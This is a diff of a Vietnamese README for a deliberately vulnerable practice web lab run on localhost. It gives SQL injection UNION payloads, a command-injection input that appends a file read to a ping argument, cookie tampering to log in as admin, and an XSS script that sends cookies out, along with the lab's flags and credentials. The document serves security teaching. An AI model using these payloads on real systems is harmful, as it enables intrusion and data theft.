@@ -1,219 +1,151 @@
-                                                                                                                                                                                # 🔐 Security Lab - Web Security Practice
+# 🔐 Security Lab - Web Security Practice
 
 Dự án web để thực hành các kỹ thuật bảo mật và tấn công web trong môi trường kiểm soát.
 
-## 📋 Tính năng
-
--   **Trang chủ**: Hiển thị danh sách các lab bảo mật
--   **SQL Injection Lab** (`/lab/sqli`): Thực hành kỹ thuật tấn công SQL Injection
-    -   Hiển thị tất cả title từ bảng posts ngay khi vào trang
-    -   Thanh tìm kiếm bài viết theo tiêu đề
-    -   Query SQL không được filter (có lỗ hổng cố tình)
-    -   Hiển thị query SQL đang thực thi
-    -   Gợi ý và hướng dẫn khai thác
--   **Command Injection Lab** (`/lab/cmdi`): Thực hành kỹ thuật Command Injection
-    -   Công cụ ping network
-    -   Command không được filter (có lỗ hổng cố tình)
-    -   Hiển thị command đang thực thi
-    -   File bí mật để khai thác
-    -   Gợi ý và hướng dẫn phòng chống
--   **Authentication Bypass Lab** (`/lab/auth`): Thực hành kỹ thuật vượt qua xác thực
-    -   Hệ thống login với cookie
-    -   Cookie lưu username:password không an toàn
-    -   Bảng tin comments với Stored XSS
-    -   Bypass để đăng nhập admin
-    -   Session Hijacking với XSS
-    -   **🌐 Chrome Auto-Login**: Tự động mở Chrome để đăng nhập admin khi phát hiện XSS
-    -   Gợi ý và hướng dẫn bảo mật
-
-## 🗄️ Cấu trúc Database
-
-### Bảng `posts`
-
-```sql
-- id (INTEGER PRIMARY KEY)
-- title (TEXT)
-- content (TEXT)
-```
-
-### Bảng `users`
-
-```sql
-- id (INTEGER PRIMARY KEY)
-- username (TEXT)
-- password (TEXT)
-- email (TEXT)
-```
-
-### Bảng `secret`
-
-```sql
-- id (INTEGER PRIMARY KEY)
-- flag (TEXT)
-- description (TEXT)
-```
-
-## 🚀 Cài đặt và Chạy
-
-### 1. Cài đặt dependencies
+## 🚀 Quick Start
 
 ```bash
+# Cài đặt
 npm install
+
+# Chạy với cấu trúc mới (khuyến nghị)
+node server-new.js
+
+# Hoặc cấu trúc cũ
+node server.js
+
+# Truy cập
+open http://localhost:3000
 ```
 
-### 2. Chạy server
+## 📚 Documentation
+
+📖 **Tài liệu đầy đủ**: [docs/README.md](./docs/README.md)
+
+### 🧪 Security Labs
+
+-   **[SQL Injection Lab](./docs/labs/sql-injection.md)** - Thực hành SQL Injection
+-   **[Command Injection Lab](./docs/labs/command-injection.md)** - Thực hành Command Injection
+-   **[Authentication Bypass Lab](./docs/labs/authentication-bypass.md)** - Thực hành vượt qua xác thực
+-   **[XSS Lab](./docs/labs/xss.md)** - Thực hành Cross-Site Scripting
+
+### 📖 Guides
+
+-   **[Quick Start](./docs/guides/quickstart.md)** - Bắt đầu nhanh
+-   **[Architecture](./docs/guides/architecture.md)** - Kiến trúc hệ thống
+
+## 🎯 Tính Năng Chính
+
+### 🔍 Security Labs
+
+-   **SQL Injection Lab** (`/lab/sqli`) - Khai thác lỗ hổng SQL Injection
+-   **Command Injection Lab** (`/lab/cmdi`) - Khai thác lỗ hổng Command Injection
+-   **Authentication Bypass Lab** (`/lab/auth`) - Vượt qua xác thực và XSS
+-   **XSS Lab** - Cross-Site Scripting với Chrome automation
+
+### 🌟 Tính Năng Đặc Biệt
+
+-   **🌐 Chrome Auto-Login** - Tự động mở Chrome khi phát hiện XSS
+-   **🔄 Auto-Reset** - Tự động reset comments khi về trang chủ
+-   **📸 Screenshot** - Chụp ảnh màn hình khi XSS execute
+-   **🚨 Real-time Detection** - Phát hiện XSS patterns real-time
+
+## 🏗️ Cấu Trúc Dự Án
+
+### Cấu Trúc Mới (MVC)
+
+```
+src/
+├── config/          # Cấu hình
+├── controllers/     # Business logic
+├── models/          # Data models
+├── routes/          # Route definitions
+├── middleware/      # Middleware functions
+├── services/        # Business services
+└── app.js          # Main application
+```
+
+### Cấu Trúc Cũ (Monolithic)
+
+```
+server.js           # Main server file
+browser-automation.js # Chrome automation
+views/              # EJS templates
+public/             # Static assets
+```
+
+## 🎯 Quick Exploits
+
+### SQL Injection
 
 ```bash
-npm start
+# Tìm kiếm: ' UNION SELECT id, flag FROM secret--
+# FLAG: FLAG{SQL_1nj3ct10n_M4st3r}
 ```
 
-Hoặc chế độ development với auto-reload:
+### Command Injection
 
 ```bash
-npm run dev
+# Ping: 8.8.8.8; cat secret.txt
+# FLAG: FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
 ```
 
-### 3. Truy cập ứng dụng
+### Authentication Bypass
 
-Mở trình duyệt và truy cập: `http://localhost:3000`
-
-## 🎯 Hướng dẫn SQL Injection Lab
-
-### Mục tiêu
-
-1. Phát hiện lỗ hổng SQL Injection trong chức năng tìm kiếm
-2. Khai thác để lấy thông tin từ các bảng khác
-3. Tìm flag bí mật trong bảng `secret`
-
-### Gợi ý
-
-**Level 1 - Phát hiện lỗ hổng:**
-
-```
-Thử nhập: '
-Nếu báo lỗi SQL => có lỗ hổng
+```bash
+# 1. Login: user1 / password1
+# 2. F12 → Application → Cookies → Sửa auth thành admin:admin123
+# 3. Refresh → FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck}
 ```
 
-**Level 2 - Xác định số cột:**
+### XSS + Session Hijacking
 
-```
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--  (sẽ lỗi vì chỉ có 2 cột)
-```
-
-**Level 3 - Union-based SQL Injection:**
-
-```
-' UNION SELECT 1, 2--
+```html
+<!-- Post comment: -->
+<script>
+    fetch("/api/steal?cookie=" + document.cookie);
+</script>
+<!-- Chrome sẽ tự động mở và trigger XSS! -->
 ```
 
-**Level 4 - Khám phá các bảng:**
+## 🗄️ Database Schema
 
-```
-' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--
-```
+### Bảng `posts` (5 records)
 
-**Level 5 - Lấy flag:**
-
-```
-' UNION SELECT id, flag FROM secret--
-```
-
-## 🎯 Hướng dẫn Command Injection Lab
-
-### Truy cập
-
-`http://localhost:3000/lab/cmdi`
-
-### Mục tiêu
-
-1. Test công cụ ping với IP/domain hợp lệ
-2. Phát hiện lỗ hổng Command Injection
-3. Khai thác để thực thi lệnh hệ thống
-4. Đọc file bí mật `secret.txt` và lấy FLAG
-
-### Gợi ý
-
-**Level 1 - Test bình thường:**
-
-```
-8.8.8.8
+```sql
+id | title                           | content
+1  | Chào mừng đến với Security Lab  | Đây là bài viết đầu tiên
+2  | SQL Injection là gì?            | SQL Injection là một kỹ thuật tấn công...
+3  | Bảo mật web căn bản             | Các nguyên tắc bảo mật cơ bản
+4  | OWASP Top 10                    | Danh sách 10 lỗ hổng phổ biến nhất
+5  | Cross-Site Scripting (XSS)      | Tấn công XSS hoạt động như thế nào
 ```
 
-**Level 2 - Phát hiện lỗ hổng:**
+### Bảng `users` (3 users)
 
-```
-8.8.8.8; whoami
-```
-
-**Level 3 - Liệt kê file:**
-
-```
-8.8.8.8; ls -la
+```sql
+id | username | password  | email
+1  | admin    | admin123  | admin@lab.local
+2  | user1    | password1 | user1@lab.local
+3  | user2    | password2 | user2@lab.local
 ```
 
-**Level 4 - Lấy FLAG:**
+### Bảng `secret` (1 flag)
 
-```
-8.8.8.8; cat secret.txt
-```
-
-**FLAG:** `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`
-
-**Hướng dẫn chi tiết:** Xem file `CMDI-GUIDE.md`
-
-## 🎯 Hướng dẫn Authentication Bypass Lab
-
-### Truy cập
-
-`http://localhost:3000/lab/auth`
-
-### Mục tiêu
-
-1. Đăng nhập với tài khoản user bình thường
-2. Phát hiện lỗ hổng cookie không an toàn
-3. Bypass authentication để đăng nhập admin
-4. Đọc comment bí mật và lấy FLAG
-
-### Gợi ý
-
-**Level 1 - Đăng nhập bình thường:**
-
-```
-user1 / password1
+```sql
+id | flag                           | description
+1  | FLAG{SQL_1nj3ct10n_M4st3r}    | Bí mật của hệ thống
 ```
 
-**Level 2 - Kiểm tra cookie:**
+### Bảng `comments` (4 comments)
 
-DevTools (F12) → Application → Cookies → Xem cookie `auth`
-
-**Level 3 - Phát hiện lỗ hổng:**
-
-Cookie có dạng: `username:password` (plaintext!)
-
-**Level 4 - Bypass authentication:**
-
-Sửa cookie thành: `admin:admin123`
-
-**Level 5 - Lấy FLAG:**
-
-Xem comment của admin trong bảng tin
-
-**FLAG:** `FLAG{4uth_Byp4ss_C00k13_H4ck}`
-
-**Hướng dẫn chi tiết:** Xem file `AUTH-GUIDE.md`
-
-**Kỹ thuật nâng cao:** Xem file `XSS-DEMO.md` để học cách kết hợp XSS với Session Hijacking
-
-**🌐 Chrome Auto-Login:** Xem file `CHROME-AUTO-GUIDE.md` để học về tính năng tự động mở Chrome
-
-## ⚠️ Lưu ý Bảo mật
-
--   Dự án này được thiết kế **CÓ LỖ HỔNG** cho mục đích học tập
--   **KHÔNG** sử dụng code này trong môi trường production
--   Chỉ sử dụng cho mục đích nghiên cứu và học tập
--   Query SQL không được sanitize hoặc validate
+```sql
+id | username | comment
+1  | admin    | Chào mừng đến với hệ thống!
+2  | admin    | 🚩 FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck} - Chỉ admin mới thấy được!
+3  | user1    | Tính năng rất hay!
+4  | user2    | Mình đã đăng nhập thành công!
+```
 
 ## 🛠️ Tech Stack
 
@@ -221,44 +153,121 @@ Xem comment của admin trong bảng tin
 -   **Database**: SQLite3
 -   **Template Engine**: EJS
 -   **Frontend**: HTML, CSS, Vanilla JavaScript
+-   **Automation**: Puppeteer (Chrome)
+-   **Architecture**: MVC + Service Layer
 
-## 📝 Cấu trúc Dự án
+## ⚠️ Lưu Ý Bảo Mật
 
-```
-lelel/
-├── server.js              # File server chính
-├── package.json           # Dependencies
-├── lab.db                 # SQLite database (tự động tạo)
-├── views/
-│   ├── index.ejs         # Trang chủ
-│   └── sqli-lab.ejs      # Trang SQL Injection Lab
-└── public/
-    └── css/
-        └── style.css     # Stylesheet
-```
+-   Dự án này được thiết kế **CÓ LỖ HỔNG** cho mục đích học tập
+-   **KHÔNG** sử dụng code này trong môi trường production
+-   Chỉ sử dụng cho mục đích nghiên cứu và học tập
+-   Tất cả lỗ hổng đều được thiết kế cố tình
 
-## 🎓 Mục đích Giáo dục
+## 🎓 Mục Đích Giáo Dục
 
 Dự án này giúp:
 
--   Hiểu cách hoạt động của SQL Injection
--   Nhận biết code không an toàn
--   Học cách khai thác lỗ hổng bảo mật
--   Áp dụng kiến thức để viết code an toàn hơn
+-   ✅ Hiểu cách hoạt động của các lỗ hổng bảo mật phổ biến
+-   ✅ Nhận biết code không an toàn
+-   ✅ Học cách khai thác lỗ hổng bảo mật
+-   ✅ Áp dụng kiến thức để viết code an toàn hơn
+-   ✅ Trải nghiệm real-world attack scenarios
 
-## 🔒 Code An toàn
+## 🔒 Code An Toàn
 
-Để viết code an toàn, **LUÔN** sử dụng Prepared Statements:
+Để viết code an toàn, **LUÔN** sử dụng:
+
+### SQL Injection Prevention
 
 ```javascript
-// ❌ KHÔNG AN TOÀN (như trong lab)
+// ❌ KHÔNG AN TOÀN
 const query = `SELECT * FROM posts WHERE title LIKE '%${searchTerm}%'`;
 
-// ✅ AN TOÀN (sử dụng parameterized query)
+// ✅ AN TOÀN
 const query = `SELECT * FROM posts WHERE title LIKE ?`;
 db.all(query, [`%${searchTerm}%`], callback);
 ```
 
+### Command Injection Prevention
+
+```javascript
+// ❌ KHÔNG AN TOÀN
+exec(`ping ${ip}`, callback);
+
+// ✅ AN TOÀN
+execFile("ping", ["-c", "4", ip], callback);
+```
+
+### XSS Prevention
+
+```javascript
+// ❌ KHÔNG AN TOÀN
+<%- comment %>
+
+// ✅ AN TOÀN
+<%= comment %>
+```
+
+### Authentication Security
+
+```javascript
+// ❌ KHÔNG AN TOÀN
+res.cookie("auth", `${username}:${password}`);
+
+// ✅ AN TOÀN
+const token = jwt.sign({ userId: user.id }, secret);
+res.cookie("token", token, { httpOnly: true });
+```
+
+## 📊 So Sánh: Cũ vs Mới
+
+| Tính năng             | Cấu trúc cũ         | Cấu trúc mới              |
+| --------------------- | ------------------- | ------------------------- |
+| **Architecture**      | Monolithic          | MVC + Service Layer       |
+| **Maintainability**   | Khó bảo trì         | Dễ bảo trì                |
+| **Scalability**       | Khó mở rộng         | Dễ mở rộng                |
+| **Testability**       | Khó test            | Dễ test                   |
+| **Code Organization** | Tất cả trong 1 file | Tách riêng theo chức năng |
+| **Documentation**     | Cơ bản              | Đầy đủ và chi tiết        |
+
+## 🚀 Migration Guide
+
+### Từ Cấu Trúc Cũ Sang Mới
+
+1. **Backup**: Sao lưu `server.js` cũ
+2. **Test**: Chạy `server-new.js`
+3. **Verify**: Kiểm tra tất cả tính năng
+4. **Replace**: Thay thế nếu ổn định
+5. **Cleanup**: Xóa code cũ không cần thiết
+
+## 📞 Hỗ Trợ
+
+Nếu gặp vấn đề:
+
+1. Kiểm tra [Troubleshooting Guide](./docs/guides/troubleshooting.md)
+2. Xem [FAQ](./docs/guides/faq.md)
+3. Tạo issue trên GitHub
+
+## 📝 Changelog
+
+### Version 2.0.0 (2025-01-16)
+
+-   ✨ Cấu trúc MVC mới
+-   📚 Documentation đầy đủ
+-   🔧 Improved code organization
+-   🛡️ Enhanced security features
+
+### Version 1.4.0 (2025-01-15)
+
+-   🌐 Chrome Auto-Login feature
+-   📸 Screenshot automation
+-   🔄 Auto-reset comments
+-   🚨 Real-time XSS detection
+
 ---
 
-Made for educational purposes 🎓
+**Made for educational purposes** 🎓
+
+**Version**: 2.0.0  
+**Last Updated**: 2025-01-16  
+**Maintainer**: Security Lab Team
